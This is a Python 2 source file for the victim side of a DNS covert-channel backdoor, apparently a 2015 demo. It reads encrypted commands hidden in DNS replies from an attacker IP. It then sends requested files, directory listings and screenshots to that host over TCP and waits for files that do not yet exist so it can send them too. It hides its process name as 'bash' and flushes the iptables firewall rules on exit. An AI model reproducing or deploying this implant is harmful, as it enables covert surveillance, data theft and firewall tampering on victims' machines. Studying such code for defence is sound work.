#!/usr/bin/env python2
# Program name: victim.py
# Description: this program is a demo of DNS backdoor
# server side in victim machine
# Autor: He Tian
# Date: June 12, 2015


from scapy.all import *
from scapy.layers.dns import DNSQR, DNS, DNSRR
from scapy.layers.inet import IP, UDP
from netfilterqueue import NetfilterQueue
from threading import Thread
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
from utility import *
import ConfigParser
import threading
import Queue
import time
import sys
import os
import signal
import procname
__author__ = 'root'


c = ConfigParser.ConfigParser()
c.read("config")

jobs = Queue.Queue()
PORT = c.getint('client','port')
attackerIP = c.get('client','attackerip')
KEY = c.get('client','key')
screenshot = 'screenshot'
img_name = "screen.png"

def recv_covert_message():
    os.system('iptables -t nat -A PREROUTING -p udp --sport 53 -j NFQUEUE --queue-num 1')
    q = NetfilterQueue()
    q.bind(1, callback)
    try:
        q.run()
    except:
        q.unbind()
        os.system('iptables -t nat -D PREROUTING -p udp --sport 53 -j NFQUEUE --queue-num 1')
        os.system('service iptables save')
        os.system('service iptables restart')


def callback(packet):
    data = packet.get_payload()
    pkt = IP(data)
    attackerIP = "192.168.0.20"

    if not pkt.haslayer(DNS):
        packet.drop()
    else:
        if attackerIP in pkt[DNS].an.rdata:
            message = decrypt(pkt[DNSRR].rrname,KEY)
            jobs.put(message)
            packet.drop()
        else:
            print pkt[DNSRR].rdata
            packet.accept()

def getPathandFile(filename):
    return os.path.split(filename)


def get_diretory(rootDir):
    message = ""
    if os.path.exists(rootDir) is True:
        for dirName, subdirList, fileList in os.walk(rootDir):
            message += "Found directory: " + dirName +'\n'
            for fname in fileList:
                message += "\t" + fname + '\n'
    return message

def getsize(file):
    file.seek(0, 2)
    size = file.tell()
    return size

class MessageTransferServer(Thread):
    def __init__(self,message,host,port):
        Thread.__init__(self)
        self.message = encrypt(message,KEY)
        self.host = host
        self.port = port
    def run(self):
        message_transfer = TextFileTransferService("message",self.message, self.host,self.port)
        message_transfer.sendtest()


class FileTransferServer(Thread):
    def __init__(self, filename, host, port):
        Thread.__init__(self)
        self.filename = filename
        self.host = host
        self.port = port
    def run(self):
        f = open(self.filename)
        message = encrypt(f.read(),KEY)

        txt_file_transfer= TextFileTransferService(self.filename,message,self.host,self.port)
        txt_file_transfer.sendtest()

class FileEventHandler(FileSystemEventHandler):

    def __init__(self,filename, observer):
        self.observer = observer
        self.filename = filename
    def on_created(self, event):
        if not event.is_directory and event.src_path.endswith(self.filename):
            print "Yes it is!"
            self.observer.stop()

class TextFileTransferService:
    def __init__(self, filename, message, host, port):
        self.filename = filename
        self.message = message
        self.host = host
        self.port = port
        open_port(self.port)

    def create_socket(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        return s

    def sendtest(self):
        s = self.create_socket()

        try:

            s.connect((self.host, self.port))
            print "send " + self.filename + " to " + attackerIP
            s.sendall(self.message)
        finally:
            print 'send ' + self.filename + ' sucessfully!'
            s.close()


def command_handler():
    while 1:
        print "starting reading:.....\n"
        if not jobs.empty():
            temp = jobs.get()
            filename = temp[:-1]
            if screenshot in filename:
                capture(img_name)
                conn = FileTransferServer(img_name,attackerIP,PORT)
                conn.setDaemon(True)
                conn.start()
                conn.join()
                release_port(PORT)
                delete(img_name)
            else:
                isfile = os.path.isfile(filename)
                isdir = os.path.isdir(filename)
                if isdir is True:
                    message = get_diretory(filename)
                    conn = MessageTransferServer(message,attackerIP,PORT)
                    conn.setDaemon(True)
                    conn.start()
                    conn.join()
                    release_port(PORT)
                elif isfile is True:
                    conn = FileTransferServer(filename,attackerIP,PORT)
                    conn.setDaemon(True)
                    conn.start()
                    conn.join()
                    jobs.task_done()
                    release_port(PORT)
                else:
                    path, name = getPathandFile(filename)
                    isdirectory = os.path.exists(path)
                    if isdirectory is True:
                        observer = Observer()
                        event_handler = FileEventHandler(name,observer)
                        observer.schedule(event_handler,path,recursive=False)
                        observer.start()
                        print "starting looking"
                        observer.join()
                        conn = FileTransferServer(filename, attackerIP, PORT)
                        conn.setDaemon(True)
                        conn.start()
                        conn.join()
                        jobs.task_done()
                        release_port(PORT)
                    else:
                        conn = MessageTransferServer("this path is invalide!\n",attackerIP,PORT)
                        conn.setDaemon(True)
                        conn.start()
                        conn.join()
                        jobs.task_done()
                        release_port(PORT)
        else:
            pass

        time.sleep(3)


def main():
    procname.setprocname('bash')
    recv_thread = threading.Thread(target=recv_covert_message)
    recv_thread.daemon = True
    recv_thread.start()
    command_handler()

    def signal_handler(signal, frame):
        print 'restore network'
        os.system('iptables -F')
        os.system('iptables -X')
        os.system('iptables -t nat -F')
        os.system('iptables -t nat -X')
        os.system('service iptables save')
        os.system('service iptables restart')
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)


main()
